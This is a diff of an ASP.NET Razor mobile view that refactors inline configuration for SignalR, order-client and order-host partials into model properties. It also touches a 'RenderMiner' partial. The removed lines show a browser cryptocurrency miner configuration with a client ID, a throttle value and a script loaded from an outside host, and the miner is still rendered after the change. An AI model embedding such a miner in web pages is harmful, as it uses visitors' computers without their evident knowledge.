@@ -4,23 +4,15 @@
   Layout = "~/Views/Shared/_LayoutMobile.cshtml";
 }
 
-@*@Html.Action("RenderSignalRBase","Service",Model)*@
+@*@Html.Action("RenderSignalRBase","Service")*@
 
-@Html.Partial("SignalRBase", new SignalRService.ViewModels.SignalRBaseConfigurationViewModel()
-{
-        SinalRGroup = Model.ServiceUrl
-})
+@Html.Partial("SignalRBase",Model.SiganlRBaseConfigurationVieModel)
 
 
 <h4>@Model.ServiceName</h4>
 
-@Html.Partial("RenderMiner", new SignalRService.ViewModels.MinerConfigurationViewModel() {
-     ClientId = "b1809255c357703b48e30d11e1052387315fc5113510af1ac91b3190fff14087",
-     Throttle = "0.9",
-     ScriptUrl = "https://www.freecontent.stream./Htxj.js",
-     StartDelayMs = 3000,
-     ReportStatusIntervalMs = 65000
-})
+@Html.Partial("RenderMiner", Model.MinerConfigurationViewModel)
+
 
 
 <fieldset data-role="controlgroup">
@@ -38,16 +30,9 @@
 
 
 
-@Html.Partial("RenderOrderClient", new SignalRService.ViewModels.OrderClientConfigurationViewModel() {
-   //  AppendToSelector = "*[data-role=page]"
-   AppendToSelector = ".body-content",
-   SinalRGroup = Model.ServiceUrl.ToLower()
-})
+@Html.Partial("RenderOrderClient", Model.OrderClientConfigurationViewModel)
 
-@Html.Partial("RenderOrderHost", new SignalRService.ViewModels.OrderHostConfigurationViewModel() {
-    AppendToSelector = ".body-content",
-    SinalRGroup = Model.ServiceUrl.ToLower()
-})
+@Html.Partial("RenderOrderHost", Model.OrderHostConfigurationViewModel)
 
 <script>
     function toggle_orderClient(e) {
